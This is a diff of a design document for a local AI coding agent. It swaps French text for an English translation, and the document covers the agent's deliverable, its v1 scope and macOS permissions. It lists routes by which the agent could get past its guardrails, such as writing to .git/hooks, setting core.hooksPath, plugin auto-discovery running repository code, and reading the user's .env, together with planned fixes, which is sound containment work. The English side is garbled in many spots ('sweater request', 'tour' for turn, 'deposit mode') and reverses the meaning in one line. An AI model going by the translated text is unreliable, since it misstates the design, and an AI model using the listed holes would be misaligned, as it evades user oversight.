+| `git checkout -b` | [repo-host.ts:169](../../lib/server/agent/repo-host.ts#L169) | Changes its branch under its fingers |
+| `git config user.email/user.name` | [repo-host.ts:163-164](../../lib/server/agent/repo-host.ts#L163-L164), :248-249 | Rewrites **its** git identity in **its** repository (measured) |
 
-Le troisième se règle en une passe : identité **par commande** (`git -c
-user.email=…`), jamais persistée. Les deux premiers imposent de trancher le
-livrable — voir D2bis.
+The third can be set in one pass: identity **by command** (`git -c
+user.email=…`), never persisted. The first two require deciding the
+deliverable — see D2bis.
 
-**Deux garde-fous perdent leur sens** et il faut le dire : le worktree était
-présenté comme la frontière qui empêche l'agent de marcher sur l'humain. En mode
-courant, cette frontière n'existe plus du tout. Et deux trous du §4 deviennent
-directs au lieu d'exiger un `git -C` : écrire dans `.git/hooks/` par le shell, et
-`git config core.hooksPath`. **Ils passent de « majeur » à « bloquant v1 ».**
+**Two guardrails lose their meaning** and it must be said: the worktree was
+presented as the boundary that prevents the agent from stepping on the human. In mode
+Currently, this border no longer exists at all. And two holes in §4 become
+direct instead of requiring a `git -C`: write to `.git/hooks/` through the shell, and
+`git config core.hooksPath`. **They go from “major” to “blocking v1”.**
 
-### D2bis. Le livrable en mode courant — **TRANCHÉ (2026-08-15) : B**
+### D2bis. The deliverable in current mode — **CLEARED (2026-08-15): B**
 
-> **Décision du PO, prise en voyant le premier vrai tour local.** L'agent avait
-> édité `test.txt` dans le dépôt courant *et* poussé une branche
-> `minddy/agent/note-…` sur la forge. Verdict : *« il ne faut pas qu'il crée une
-> branche en mode local, puisqu'il édite en local. »*
+> **PO's decision, taken upon seeing the first real local tour.** The agent had
+> edited `test.txt` in the current repository *and* pushed a branch
+> `minddy/agent/note-…` on the forge. Verdict: *“it must not create a
+> branch in local mode, since it edits locally. »*
 >
-> **Le tour ne commite rien et ne pousse rien** ([supervisor.ts](../../lib/server/agent/vm/supervisor.ts),
-> fin de tour). Son livrable est l'arbre de travail : l'agent édite, le fil dit ce
-> qui a bougé (lu dans l'arbre, borné au périmètre du tour), et l'humain relit
-> dans son éditeur puis commite lui-même.
+> **The tour commits nothing and pushes nothing** ([supervisor.ts](../../lib/server/agent/vm/supervisor.ts),
+> end of turn). Its deliverable is the work tree: the agent edits, the thread says what
+> which has moved (read in the tree, limited to the perimeter of the turn), and the human reads again
+> in its editor then commits itself.
 >
-> **Ce qui a emporté la décision n'est pas la théorie, c'est ce qu'on voyait à
-> l'écran** : la branche était poussée par sha depuis un index jetable, donc elle
-> n'existait nulle part en local. On la lisait dans l'interface sans pouvoir la
-> retrouver dans son propre `git branch` — une branche qu'on n'a pas demandée, à
-> un endroit qu'on ne voit pas.
+> **What won the decision was not the theory, it was what we saw
+> the screen**: the branch was pushed by sha from a disposable index, so it
+> did not exist anywhere locally. We read it in the interface without being able to
+> find in its own `git branch` — a branch that we did not request,
+> a place that we cannot see.
 >
-> **Ce que ça coûte, et c'est un cinquième écart au critère du §4** : la pull
-> request cesse d'être la fin d'un tour pour devenir un **geste explicite** —
-> `create_pr`, toujours servi, qui pousse quand on le lui demande. Aucune ligne de
-> la machinerie de MIN-358 ne meurt : elle change de déclencheur.
+> **What it costs, and this is a fifth deviation from the criterion of §4**: the sweater
+> request ceases to be the end of a turn to become an **explicit gesture** —
+> `create_pr`, always served, which pushes when asked. No line of
+> the MIN-358 machinery does not die: it changes triggers.
 >
-> **Ce que ça supprime en prime** : le chevauchement avec le travail de l'humain
-> (`current_repo_overlap`) ne peut plus arriver tout seul. Sans commit
-> automatique, plus rien n'emporte les fichiers de quelqu'un dans une pull request
-> qu'il n'a pas demandée — c'était le trou que le §D2 disait « non optionnel » et
-> qu'aucune astuce ne refermait.
+> **What this eliminates as a bonus**: the overlap with human work
+> (`current_repo_overlap`) can no longer happen on its own. Without commit
+> automatic, nothing takes away someone's files in a pull request
+> which he did not ask for — it was the hole that §D2 said “non-optional” and
+> that no trick closed.
 >
-> L'option **C** (worktree dédié dès qu'une PR est demandée) reste ouverte et
-> devient le prolongement naturel : c'est le même geste explicite, avec un dossier
-> à part.
+> Option **C** (dedicated worktree as soon as a PR is requested) remains open and
+> becomes the natural extension: it is the same explicit gesture, with a file
+> apart.
 
-Trois formes, à choisir avant le lot de livraison.
+Three shapes, to choose before the delivery batch.
 
-- **A — Staging sélectif, branche non changée.** `git add -- <chemins de l'agent>`
-  au lieu de `-A`. Minddy connaît déjà ces chemins (`delivery.noteEdit`). **Mais**
-  la mesure n°7 devient critique : un « toujours » sur `edit` porte `*` et rend
-  les éditions suivantes muettes — la liste serait alors **fausse**, pas seulement
-  incomplète. Et elle ignore les fichiers créés par le shell (un `npm install` qui
-  réécrit le lockfile, un codegen). *Repli impossible sur `git status` : il voit
-  aussi le WIP de l'humain.*
-- **B — Pas de commit du tout.** Le tour laisse les changements dans l'arbre de
-  travail, le fil dit ce qui a bougé, l'humain relit dans son éditeur et commite.
-  **C'est exactement le produit de Claude Code**, et c'est cohérent avec D2. Mais
-  ce n'est plus « le produit est identique, seule la machine change » : la PR
-  devient un geste explicite, pas la fin du tour.
-- **C — Worktree dédié dès qu'une PR est demandée.** Le mode courant sert à
-  itérer, le mode worktree à livrer. Le sélecteur porte alors deux choses.
+- **A — Selective staging, branch not changed.** `git add -- <chemins de l'agent>`
+  instead of `-A`. Minddy already knows these paths (`delivery.noteEdit`). **But**
+  measure n°7 becomes critical: an “always” on `edit` carries `*` and returns
+  subsequent editions silent — the list would then be **false**, not only
+  incomplete. And it ignores files created by the shell (a `npm install` which
+  rewrites the lockfile, a codegen). *Fallback impossible on `git status`: he sees
+  also the WIP of the human.*
+- **B — No commit at all.** The trick leaves the changes in the commit tree
+  work, the thread says what changed, the human rereads in his editor and commits.
+  **This is exactly Claude Code's product**, and it is consistent with D2. But
+  it is no longer “the product is identical, only the machine changes”: PR
+  becomes an explicit gesture, not the end of the round.
+- **C — Dedicated Worktree as soon as a PR is requested.** Current mode is used to
+  iterate, the worktree mode to deliver. The selector then carries two things.
 
-### D3. V1 = le dossier du projet, rien d'autre
+### D3. V1 = the project folder, nothing else
 
-**L'accès au reste de l'ordinateur sort de la v1.** L'agent voit le dépôt local
-attribué au projet, point.
+**Access to the rest of the computer is out of v1.** The agent sees the local repository
+assigned to the project, period.
 
-**Ce qui sort du périmètre, et c'est l'essentiel du poids :**
+**What goes outside the perimeter, and that's most of the weight:**
 
-- tout le §2 (le mur de papier) — `external_directory` reste en `deny` ;
-- tout le §3 (approbations humaines) : le troisième verdict `ask`, le canal
-  descendant, la table des demandes, le TTL, la cascade, les notifications
-  actionnables, la fatigue, la portée d'un « oui », les grants durables ;
-- les N racines, `denyRoots`, `readRoots`, la liste noire, le `realpath` ;
-- `PermissionVerdict` garde `once | reject`, `decidePermission` ne bouge presque
-  pas.
+- all of §2 (the wall of paper) — `external_directory` remains in `deny`;
+- all §3 (human approvals): the third verdict `ask`, the channel
+  descendant, request table, TTL, cascade, notifications
+  actionable, fatigue, the scope of a “yes”, sustainable grants;
+- the N roots, `denyRoots`, `readRoots`, the blacklist, the `realpath`;
+- `PermissionVerdict` keeps `once | reject`, `decidePermission` almost doesn't move
+  not.
 
-**Ce qui reste non négociable en v1**, parce que ça ne dépend pas de l'accès hors
-dossier :
+**Which remains non-negotiable in v1**, because it does not depend on access outside
+folder:
 
-1. `default: return ALLOW` → `reject` sur le chemin local
+1. `default: return ALLOW` → `reject` on local path
    ([opencode-permissions.ts:183-185](../../lib/server/agent/vm/opencode-permissions.ts#L183-L185)).
-2. **Fermer l'auto-découverte des plugins** `.opencode/plugin(s)/` (§11.5) — en
-   mode dépôt courant, c'est de l'exécution de code arbitraire depuis le contenu
-   d'un dépôt, sur la machine de l'utilisateur.
-3. **`read: "allow"`** (§11.5) : en mode dépôt courant, le `.env` **réel** de
-   l'utilisateur est là, et notre config efface la question qu'opencode posait.
-   Ce qui était une décision v2 devient une décision v1.
-4. La garde de chemin **normalisée** du proxy LLM, le mint obligatoire, le refus
-   BYOK en local (§4, verrou 2).
-5. `git config core.hooksPath` / `git -C` / écriture dans `.git/` par le shell.
-6. Le chien de garde à 15 min, `sandboxMs` borné **côté serveur**, l'invariant
-   « un run à contenu tiers ne part jamais en local » (§7).
-7. Le scan de secrets avant push, et la décision sur `agent_run_journal` (§6).
+2. **Close plugin auto-discovery** `.opencode/plugin(s)/` (§11.5) — in
+   current repository mode, this is the execution of arbitrary code from the content
+   from a repository, on the user's machine.
+3. **`read: "allow"`** (§11.5): in current deposit mode, the `.env` **real** of
+   the user is there, and our config clears the question that opencode was asking.
+   What was a v2 decision becomes a v1 decision.
+4. **Normalized** path guarding of the LLM proxy, mandatory mint, refusal
+   BYOK locally (§4, lock 2).
+5. `git config core.hooksPath` / `git -C` / writing to `.git/` by the shell.
+6. The watchdog at 15 min, `sandboxMs` bounded **server side**, the invariant
+   “a run with third-party content never goes local” (§7).
+7. The scanning of secrets before push, and the decision on `agent_run_journal` (§6).
 
-### D4. Les autorisations de dossier macOS sont dans le périmètre
+### D4. macOS folder permissions are in scope
 
-`~/Documents` et `~/Desktop` sont des emplacements courants pour un dépôt ; sans
-traitement, l'accès est refusé **et la fenêtre de demande ne s'ouvre même pas**.
+`~/Documents` and `~/Desktop` are common locations for a repository; without
+processing, access is denied **and the request window does not even open**.
 
-À faire : les `NS…UsageDescription` (Documents, Desktop, Downloads, volumes
-amovibles) via `extendInfo` d'electron-builder — **en sachant que ça change
-l'empreinte de republication**, donc republication + renotarisation.
+To do: `NS…UsageDescription` (Documents, Desktop, Downloads, volumes
+removable) via `extendInfo` from electron-builder — **knowing that it changes
+the republication imprint**, therefore republication + renotarization.
 
-**À mesurer avant, parce que ça pourrait être plus propre :** le geste
-d'attachement du dossier au projet passe forcément par un `dialog.showOpenDialog`
-(aujourd'hui jamais utilisé dans la coquille). Une sélection par panneau système
-vaut consentement explicite et peut suffire à ouvrir le chemin sans invite TCC.
-**Non vérifié**, et il y a une seconde inconnue qui compte davantage : le harness
-est un process **enfant**, et opencode un petit-enfant. Il faut mesurer si le
-droit descend jusqu'aux shells du modèle. C'est un argument de plus pour
-`utilityProcess.fork` (enfant du bundle signé) contre un process détaché, qui
-perd son processus responsable.
+**To measure before, because it could be cleaner:** the gesture
+attaching the file to the project necessarily involves a `dialog.showOpenDialog`
+(today never used in the shell). One selection per system panel
+constitutes explicit consent and may be sufficient to open the path without a TCC prompt.
+**Not verified**, and there is a second unknown that matters more: the harness
+is a **child** process, and opencode is a grandchild. It is necessary to measure whether the
+right goes down to the shells of the model. This is one more argument for
+`utilityProcess.fork` (child of the signed bundle) against a detached process, which
+loses its responsible process.
